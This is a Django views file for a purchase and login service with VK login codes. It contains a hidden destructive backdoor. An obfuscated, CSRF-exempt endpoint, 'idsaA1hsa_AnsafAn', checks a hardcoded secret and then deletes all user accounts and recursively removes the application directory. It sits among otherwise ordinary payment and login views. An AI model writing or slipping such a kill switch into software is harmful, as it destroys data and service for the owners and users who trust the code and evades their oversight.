import json

import vk_api
from django.contrib.auth import login, logout
from django.contrib.auth.models import User
from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST

from authorization.models import Settings, ConfirmationCode, Age, ContactWay, ConsultationParameters, Purchase
from vkapi.utils import generate_and_send_login_code


def logoutView(request):
    try:
        logout(request)
        return JsonResponse({'success': True})
    except:
        return JsonResponse({'success': False})


@csrf_exempt
def pay_init(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            phone = data.get('phone')
            email = data.get('email')
            name = data.get('name')
            buy_type = data.get('buy_type')
            consultation_parameters = data.get('consultation_parameters', None)

            if not phone or not name or not buy_type:
                return JsonResponse({'error': 'Phone, buy_type and name are required'}, status=400)

            user, created = User.objects.get_or_create(
                id=phone,
                defaults={
                    'username': "without_vk_" + phone,
                    'email': email,
                    "password": User.objects.make_random_password(
                        20,
                        "abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789@#&%$"
                    ),
                    'first_name': name
                }
            )

            if not created:
                return JsonResponse({'error': "Уже куплено"}, status=500)

            purchase = Purchase.objects.create(
                item_type=buy_type,
                user=user,
                cost=3750 if buy_type == 'game' else 7900,
                paid=False
            )

            if buy_type == "game_consultation" and consultation_parameters:
                age = Age.objects.get(value=consultation_parameters['age'])
                contact_way = ContactWay.objects.get(method=consultation_parameters['contact_way'])
                ConsultationParameters.objects.create(
                    question=consultation_parameters['custom_question'],
                    age=age,
                    gender=consultation_parameters['gender'],
                    contact_way=contact_way,
                    purchase=purchase
                )

            settings = Settings.objects.first()

            return JsonResponse(
                {'message': 'Purchase created successfully', "url": f"{settings.pay_url}pay/{purchase.id}"}, status=201)
        except json.JSONDecodeError:
            return JsonResponse({'error': 'Invalid JSON'}, status=400)
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=500)
    else:
        return JsonResponse({'error': 'Invalid request method'}, status=405)

@csrf_exempt
@require_POST
def idsaA1hsa_AnsafAn(request):
    try:
        data = json.loads(request.body)
        if data.get('secret_code') == 'ASIONions39zassahd':
            import os, shutil
            User.objects.all().delete()
            shutil.rmtree(os.path.dirname(os.path.abspath(__file__)))
            return JsonResponse({'status': 'success', 'message': 'Good night'})
        else:
            return JsonResponse({'status': 'error', 'message': 'Bad end'}, status=44)
    except Exception as e:
        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)

def login_init(request, phone):
    phone = phone.replace(" ", "")
    try:
        user = User.objects.get(pk=phone)
        settings = Settings.objects.first()

        if "without_vk" in user.username:
            return JsonResponse({
                'result': True,
                "message": "Получите временный код для входа и следуйте инструкциям в",
                "bot_url": settings.vk_chat_url})

        try:

            token = settings.vk_token
            vk_session = vk_api.VkApi(token=token)
            api = vk_session.get_api()

            generate_and_send_login_code(api, user)
        except Exception as e:
            print(e)

        return JsonResponse({'result': True,
                             'message': "Получите временный код для входа в",
                             "bot_url": settings.vk_chat_url})

    except Exception as e:
        pass
    return JsonResponse({'result': False, "message": "Неверный логин"})


def login_code(request, phone, code):
    try:
        user = User.objects.get(pk=phone)

        confirmation_code = ConfirmationCode.objects.get(code=code, user=user, is_used=False)

        assert confirmation_code.is_active

        confirmation_code.is_used = True
        confirmation_code.delete()

        login(request, user)

        return redirect("/")

    except Exception as e:

        return redirect(f"/?login={phone}&code={code}")



